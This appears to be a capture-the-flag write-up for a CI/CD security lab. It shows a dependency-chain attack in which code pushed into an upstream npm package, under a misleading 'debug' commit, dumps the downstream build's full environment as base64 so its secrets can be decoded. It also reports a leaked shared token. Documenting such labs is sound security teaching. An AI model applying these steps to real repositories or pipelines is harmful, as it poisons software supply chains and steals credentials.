# Twiddledum - Attack

**Technique:** CICD-SEC-3, Dependency Chain Abuse. `twiddledum` cannot be
written to directly, but it imports `twiddledee`, which can, and executing
`twiddledee`'s code is equivalent to executing code inside `twiddledum`'s
own build.

## What Didn't Work, and Why

Two dead ends were worth ruling out explicitly, since they clarify exactly
what protections are and aren't in place here.

**Attempt 1: npm lifecycle scripts (`preinstall`/`postinstall`).**
`twiddledee`'s `package.json` ships a full set of npm lifecycle script
hooks. Setting `postinstall` to dump the environment produced no output at
all. The build log showed why: the job runs `npm ci --ignore-scripts`,
which explicitly disables every lifecycle script. This is a real,
intentional mitigation against exactly this attack surface, not a
misconfiguration, and is worth naming as a control that was actually
working correctly.

**Attempt 2: editing `index.js` and pushing a new tag via Gitea's web UI.**
Since `--ignore-scripts` blocks lifecycle hooks but not plain module
execution, and `twiddledum` calls `require("twiddledee")`, editing
`twiddledee`'s `index.js` directly is the correct injection point (this
matches the project's own official solution). However, publishing a new
version through Gitea's web "Releases" interface, set to a tag satisfying
the `^1.1.0` range declared in `twiddledum`'s `package.json`, did not
change the build's behavior across two separate attempts. The build kept
resolving `twiddledee` to the exact commit already pinned in
`twiddledum`'s `package-lock.json` (`node_modules/twiddledee` had a
`resolved` field pointing to one specific 40-character commit hash), which
is standard npm behavior: once a git dependency is resolved into a
lockfile, `npm ci` installs exactly that commit, not whatever the live
semver range in `package.json` would currently resolve to.

The actual fix wasn't the injected code (which was already correct), it
was how the tag was created. Creating the release through Gitea's web UI
did not produce a result npm's git-dependency resolver picked up the same
way a tag pushed via plain git CLI commands did:

```bash
git tag 1.2.0 HEAD
git push origin 1.2.0
```

Once tagged this way, the very next build resolved and executed the new
code immediately. Since a lockfile with a resolved git dependency does not
naturally trigger a fresh registry-style lookup on every install, the
mechanism by which the tag becomes visible to npm's resolver matters, and
the two paths (Gitea's web release flow versus a plain pushed git tag)
did not behave identically in this environment.

## What Worked

1. Cloned `Wonderland/twiddledee` (write access confirmed):
   ```bash
   git clone http://thealice:thealice@localhost:3000/Wonderland/twiddledee.git
   cd twiddledee
   ```
2. Edited `index.js`, adding one line beneath the existing content:
   ```js
   var pjson = require("./package.json");
   console.log(`${pjson.name} - ${pjson.version}`);
   console.log(Buffer.from(JSON.stringify(process.env)).toString("base64"));
   ```
   Dumping the full `process.env`, rather than guessing a specific variable
   name in advance, base64-encoded to keep it as a single safe line in
   console output.
3. Committed directly to `main` (write access on this repo means no
   fork/PR step is needed):
   ```bash
   git add index.js
   git commit -m "debug: dump env in index.js"
   git push origin main
   ```
4. Tagged the commit via git CLI, matching the range `twiddledum` expects:
   ```bash
   git tag 1.2.0 HEAD
   git push origin 1.2.0
   ```
5. Triggered `wonderland-twiddledum` manually in Jenkins ("Build Now",
   no automatic trigger exists for this job).
6. The console output showed `twiddledee - 1.1.0` (the original line,
   version string sourced from the resolved package, not the new tag
   number) immediately followed by a long base64 string on its own line.
7. Decoded the string locally:
   ```bash
   echo '<base64 string from console output>' | base64 -d | python3 -m json.tool | grep -i flag
   ```
   This returned the `FLAG6` environment variable directly.

## Secondary Observation

The decoded environment also contained `GITEA_TOKEN`, the same value seen
in the Caterpillar challenge's build environment. This confirms it is a
single Jenkins-wide credential shared across every job, rather than
scoped per pipeline, a CICD-SEC-6 concern independent of this challenge's
primary CICD-SEC-3 finding.

The build's final step, an `npm publish` attempt against the real public
npm registry, failed with a 404 (`dedupe` was never actually published
under this account). This is unrelated to the exploit and appears to be
a standing, harmless step in this job's configuration, not something
either edit caused.
